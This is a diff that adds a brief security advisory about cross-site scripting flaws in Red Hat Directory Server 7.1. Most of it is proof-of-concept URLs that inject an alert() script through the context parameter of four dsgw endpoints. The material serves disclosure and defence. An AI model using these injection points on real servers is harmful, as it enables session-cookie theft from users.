@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/23709/info
+
+Red Hat Directory Server is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker can exploit these issues to steal cookie-based authentication credentials and launch other attacks.
+
+Red Hat Directory Server 7.1 is reported vulnerable; other versions may also be affected. 
+
+http://example.com:8001/clients/dsgw/bin/search?context=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E http://example.com:8001/clients/dsgw/bin/search?context=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E http://example.com:8001/clients/dsgw/bin/lang?context=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E http://example.com:8001/clients/dsgw/bin/lang?context=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E http://example.com:8001/clients/dsgw/bin/csearch?context=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E http://example.com:8001/clients/dsgw/bin/csearch?context=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E http://example.com:8001/clients/dsgw/bin/newentry?context=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E http://example.com:8001/clients/dsgw/bin/newentry?context=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E 
